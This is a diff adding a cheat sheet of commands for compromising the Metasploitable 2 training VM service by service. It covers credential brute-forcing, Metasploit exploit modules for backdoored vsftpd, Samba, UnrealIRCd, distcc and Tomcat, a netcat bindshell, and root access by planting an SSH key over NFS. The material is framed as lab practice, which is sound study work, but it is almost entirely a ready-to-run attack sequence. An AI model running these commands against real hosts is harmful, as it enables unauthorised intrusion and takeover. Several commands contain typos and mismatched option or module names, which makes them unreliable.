@@ -1,0 +1,113 @@
+https://www.hackingarticles.in/comprehensive-guide-on-metasploitable-2/
+
+nmap -p- -sV 192.168.1.103
+
+# Exploiting Port 21: FTP
+hydra -L user.txt -P pass.txt 192.168.1.103 ftp
+ftp 192.168.1.103
+
+#We have exploited the service running on port 21, now we will exploit the particular version of the FTP service. We will be searching for an exploit for VSFTPD 2.3.4 using Searchsploit.
+searchsploit vsftpd (# it found vsftpd 2.3.4 has backdoor command execution)
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit (unix/ftp/vsftpd_234_backdoor) > set rhost 192.168.1.103
+msf exploit (unix/ftp/vsftpd_234_backdoor) > exploit
+
+# Exploiting Port 22 SSH
+msf > use auxiliary/scanner/ssh/ssh_login
+msf auxiliary (scanner/ssh/ssh_login) > set rhosts 192.168.1.103
+msf auxiliary (scanner/ssh/ssh_login) > set user_file /root/Desktop/user.txt
+msf auxiliary (scanner/ssh/ssh_login) > set pass_file /root/Desktop/pass.txt
+msf auxiliary (scanner/ssh/ssh_login) > exploit
+
+# Bruteforce Port 22 SSH (RSA Method)
+python 5720.py 5622/rsa/2048/ 192.168.1.103 root
+
+# Exploiting port 23 TELNET (Credential Capture with wireshark)
+telnet 192.168.1.103
+Once successfully connected we go back to Wireshark. Now we click the “TCP Stream” option under Analyze > Follow. This shows us the login credentials in plain text.
+msf > use auxiliary/scanner/telnet/telnet_login
+msf auxiliary (scanner/telnet/telnet_login) > set rhosts 192.168.1.103
+msf auxiliary (scanner/telnet/telnet_login) > set user_file /root/Desktop/user.txt
+msf auxiliary (scanner/telnet/telnet_login) > set pass_file /root/Desktop/pass.txt
+msf auxiliary (scanner/telnet/telnet_login) > set stop_on_success true
+msf auxiliary (scanner/telnet/telnet_login) > exploit
+
+# Port 25 SMTP User Enumeration
+smtp-user-enum -M VRFY -U user.txt -t 192.168.1.103
+
+# Exploiting Port 80 (PHP_CGI)
+msf > use exploit/multi/http/php_arg_injection
+msf exploit (multi/http/php_arg_injection) > set rhost 192.168.1.103
+msf exploit (multi/http/php_arg_injection) > exploit
+
+# Exploiting Port 139 & 445 (Samba)
+msf > use exploit/multi/samba/usermap_script
+msf exploit (multi/samba/usermap_script) > set rhost 192.168.1.103
+msf exploit (multi/samba/usermap_script) > exploit
+
+#  Exploiting Port 8080 (Java)
+msf > use exploit/multi/misc/java_rmi_server
+msf exploit(multi/misc/java_rmi_server) > set rhost 192.168.1.103
+msf exploit(multi/misc/java_rmi_server) > exploit
+
+# Exploiting Port 5432 (Postgres)
+msf > use exploit/linux/postgres/postgres_payload
+msf exploit (linux/postgres/postgres_payload) > set rhost 192.168.1.103
+msf exploit (linux/postgres/postgres_payload) > exploit
+
+# Exploiting Port 6667 (UnrealIRCD)
+msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf exploit (unix/irc/unreal_ircd_3281_backdoor) > set rhost 192.168.1.103
+msf exploit (unix/irc/unreal_ircd_3281_backdoor) > exploit
+
+# Exploiting Port 36255 
+msf > use exploit/unix/misc/distcc_exec
+msf exploit (unix/misc/distcc_exec) > set rhost 192.168.1.103
+msf exploit (unix/misc/distcc_exec) > exploit
+
+# Remote Login Exploitation
+rlogin -l msfadmin 192.168.1.103
+msf > use auxiliary/scanner/rservices/rlogin_login
+msf auxiliary (scanner/rservices/rlogin_login) > set rhosts 192.168.1.103
+msf auxiliary (scanner/rservices/rlogin_login) > set username root
+msf auxiliary (scanner/rservices/rlogin_login) > exploit
+
+# Remote Shell Exploitation
+rsh -l msfadmin 192.168.1.103 ifconfig
+
+# Exploiting Distributed Ruby Remote Code Execution (8787)
+msf > use exploit/linux/misc/drb_remote_codeexec
+msf exploit (linux/misc/drb_remote_code) > set rhost 192.168.1.103
+msf exploit (linux/misc/drb_remote_code) > exploit
+
+# Bindshell Exploitation port 1524
+nc 192.168.1.103 1524
+
+# Exploiting Port 5900 (VNC)
+msf > use auxiliary/scanner/vnc/vnc_login
+msf auxiliary (scanner/vnc/vnc_login) > set login 192.168.1.103
+msf auxiliary (scanner/vnc/vnc_login) > exploit
+vncviewer 192.168.1.103
+
+# Access Port 2121 (ProFTPD)
+telnet 192.168.1.103 2121
+
+# Exploiting Port 8180 (Apache Tomcat)
+msf > use exploit/multi/http/tomcat_mgr_upload
+msf exploit (multi/http/tomcat_mgr_upload) > set rhost 192.168.1.103
+msf exploit (multi/http/tomcat_mgr_upload) > set rpost 8108
+msf exploit (multi/http/tomcat_mgr_upload) > set httpusername tomcat
+msf exploit (multi/http/tomcat_mgr_upload) > set httppassword tomcat
+msf exploit (multi/http/tomcat_mgr_upload) > exploit
+
+# Privilege Escalation via Port 2049: NFS
+showmount -e 192.168.1.103
+ssh-keygen
+mkdir /tmp/sshkey
+mount -t nfs 192.168.1.103:/ /tmp/sshkey/
+cat ~/ .ssh/id_rsa.pub >>/tmp/sshkey/root/.ssh/authorized_keys
+umount /tmp/sshkey
+ssh root@192.168.1.103
+
+# Exploiting Port 3306 (MYSQL)
+mysql -u root -h 192.168.1.103 -p (#The password will be left blank.)
